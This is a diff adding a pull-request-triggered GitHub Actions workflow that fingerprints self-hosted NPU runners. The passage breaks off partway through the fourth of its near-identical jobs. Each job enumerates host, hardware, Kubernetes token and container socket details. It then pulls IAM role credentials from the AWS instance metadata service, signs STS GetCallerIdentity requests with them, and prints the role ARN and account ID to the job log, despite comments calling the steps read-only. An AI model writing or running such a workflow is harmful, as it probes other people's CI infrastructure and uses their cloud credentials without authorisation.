@@ -1,0 +1,759 @@
+name: c211-i125037-residual
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  npu-800t2-01:
+    runs-on: linux-aarch64-a3-800t-2
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-800t2-01 label=linux-aarch64-a3-800t-2 nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-800t2-01 label=linux-aarch64-a3-800t-2 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-800t2-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-800t4-01:
+    runs-on: linux-aarch64-a3-800t-4
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-800t4-01 label=linux-aarch64-a3-800t-4 nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-800t4-01 label=linux-aarch64-a3-800t-4 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-800t4-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-800t8-01:
+    runs-on: linux-aarch64-a3-800t-8
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-800t8-01 label=linux-aarch64-a3-800t-8 nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-800t8-01 label=linux-aarch64-a3-800t-8 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-800t8-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-a3-2-01:
+    runs-on: linux-aarch64-a3-2-
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-a3-2-01 label=linux-aarch64-a3-2- nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-a3-2-01 label=linux-aarch64-a3-2- nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
